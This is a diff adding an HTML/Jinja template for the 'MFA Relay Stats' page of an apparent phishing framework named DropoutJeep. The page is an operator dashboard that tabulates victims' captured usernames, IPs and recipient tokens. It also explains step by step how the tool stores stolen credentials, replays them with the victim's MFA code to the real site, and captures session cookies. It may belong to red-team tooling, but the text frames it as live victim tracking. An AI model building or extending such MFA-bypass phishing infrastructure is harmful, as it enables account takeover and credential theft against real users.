@@ -1,0 +1,104 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">MFA RELAY STATS</h1>
+  </div>
+
+  <!-- Summary Cards -->
+  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+    <div class="brutal-card p-4">
+      <div class="text-xs text-gray-500 font-mono-brutal font-bold uppercase">ACTIVE SESSIONS</div>
+      <div class="text-2xl font-extrabold font-mono-brutal mt-2">{{ active | length }}</div>
+    </div>
+    <div class="brutal-card p-4">
+      <div class="text-xs text-gray-500 font-mono-brutal font-bold uppercase">TOTAL CAPTURED</div>
+      <div class="text-2xl font-extrabold font-mono-brutal mt-2">{{ all_states | length }}</div>
+    </div>
+    <div class="brutal-card p-4">
+      <div class="text-xs text-gray-500 font-mono-brutal font-bold uppercase">UNIQUE RECIPIENTS</div>
+      <div class="text-2xl font-extrabold font-mono-brutal mt-2 text-brutal-amber">{{ unique_tokens }}</div>
+    </div>
+    <div class="brutal-card p-4">
+      <div class="text-xs text-gray-500 font-mono-brutal font-bold uppercase">EXPIRED / PRUNED</div>
+      <div class="text-2xl font-extrabold font-mono-brutal mt-2 text-gray-500">{{ expired_count }}</div>
+    </div>
+  </div>
+
+  <!-- Active Sessions -->
+  <div class="brutal-card p-6 mb-8">
+    <h3 class="text-lg font-bold font-mono-brutal mb-4">Active MFA Relay Sessions</h3>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400 mb-4">
+      These are partial authentication sessions waiting for an MFA code.
+      Sessions expire after {{ ttl }} seconds. When the victim submits an MFA code,
+      it is replayed to the real target along with the stored credentials.
+    </p>
+    <div class="overflow-x-auto">
+      <table class="w-full text-sm font-mono-brutal min-w-[800px]">
+        <thead class="border-b-2 border-pure-black dark:border-stark-white">
+          <tr>
+            <th class="text-left py-2">Campaign ID</th>
+            <th class="text-left py-2">Recipient Token</th>
+            <th class="text-left py-2">Client IP</th>
+            <th class="text-left py-2">Username Field</th>
+            <th class="text-left py-2">Username</th>
+            <th class="text-left py-2">Password Field</th>
+            <th class="text-left py-2">Path</th>
+            <th class="text-left py-2">Expires At</th>
+            <th class="text-left py-2">Status</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for s in all_states %}
+          <tr class="border-b border-gray-300 dark:border-gray-700">
+            <td class="py-2 font-bold">#{{ s.campaign_id }}</td>
+            <td class="py-2 font-mono text-xs break-all">{{ s.recipient_token or '-' }}</td>
+            <td class="py-2 font-mono text-xs">{{ s.client_ip or '-' }}</td>
+            <td class="py-2 font-mono text-xs">{{ s.username_field or '-' }}</td>
+            <td class="py-2 font-mono text-xs break-all max-w-[150px]">{{ s.username_value or '-' }}</td>
+            <td class="py-2 font-mono text-xs">{{ s.password_field or '-' }}</td>
+            <td class="py-2 font-mono text-xs break-all max-w-[150px]">{{ s.path or '-' }}</td>
+            <td class="py-2 text-xs whitespace-nowrap">{{ s.expires_at.strftime('%H:%M:%S') if s.expires_at else '-' }}</td>
+            <td class="py-2">
+              {% if s.is_expired() %}
+                <span class="text-gray-500 font-bold">EXPIRED</span>
+              {% else %}
+                <span class="text-brutal-emerald font-bold">ACTIVE</span>
+              {% endif %}
+            </td>
+          </tr>
+          {% else %}
+          <tr>
+            <td colspan="9" class="py-4 text-gray-500 dark:text-gray-400">
+              No MFA relay sessions. Sessions appear here when victims submit stage-1 credentials
+              on a proxy campaign with MFA relay enabled.
+            </td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- How MFA Relay Works -->
+  <div class="brutal-card p-6">
+    <h3 class="text-lg font-bold font-mono-brutal mb-4">How MFA Relay Works</h3>
+    <ol class="list-decimal list-inside text-sm font-mono-brutal space-y-2 text-gray-600 dark:text-gray-400">
+      <li>Victim submits username + password on the proxied login page (stage 1).</li>
+      <li>DropoutJeep stores credentials in <code>MfaRelayState</code> with a TTL ({{ ttl }}s).</li>
+      <li>Victim sees the real MFA prompt (TOTP, push, SMS) and submits their code.</li>
+      <li>DropoutJeep replays credentials + MFA code to the real target.</li>
+      <li>If successful, session cookies are captured and the victim sees the real success page.</li>
+    </ol>
+  </div>
+</div>
+</div>
+{% endblock %}
